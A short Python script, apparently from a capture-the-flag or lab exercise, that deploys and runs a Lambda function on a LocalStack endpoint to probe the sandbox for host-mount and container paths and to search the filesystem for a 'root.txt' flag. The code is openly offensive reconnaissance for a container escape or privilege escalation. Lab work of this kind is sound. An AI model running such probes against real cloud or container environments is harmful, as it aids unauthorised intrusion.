import boto3
import io
import zipfile
import time

ENDPOINT = "http://172.18.0.2:4566"
client = boto3.client(
    "lambda", endpoint_url=ENDPOINT, region_name="us-east-1",
    aws_access_key_id="test", aws_secret_access_key="test",
)

code = '''
import os, subprocess
def handler(event, context):
    out = {}
    candidates = ["/var/lib/localstack", "/var/lib/docker", "/var/lib/containerd",
                  "/tmp/localstack", "/opt/code", "/hostroot", "/mnt/host"]
    for p in candidates:
        out[p] = os.path.exists(p)
    out["find_root_txt"] = subprocess.run(
        ["find", "/", "-xdev", "-maxdepth", "6", "-iname", "root.txt"],
        capture_output=True, text=True, timeout=10
    ).stdout
    out["df"] = subprocess.run(["df", "-h"], capture_output=True, text=True).stdout
    return out
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("handler.py", code)
buf.seek(0)

try:
    client.delete_function(FunctionName="probe3")
except Exception:
    pass

client.create_function(
    FunctionName="probe3",
    Runtime="python3.11",
    Role="arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/lambda-role",
    Handler="handler.handler",
    Code={"ZipFile": buf.read()},
    Timeout=30,
)
time.sleep(3)
inv = client.invoke(FunctionName="probe3", Payload=b"{}")
print("PAYLOAD", inv["Payload"].read().decode())
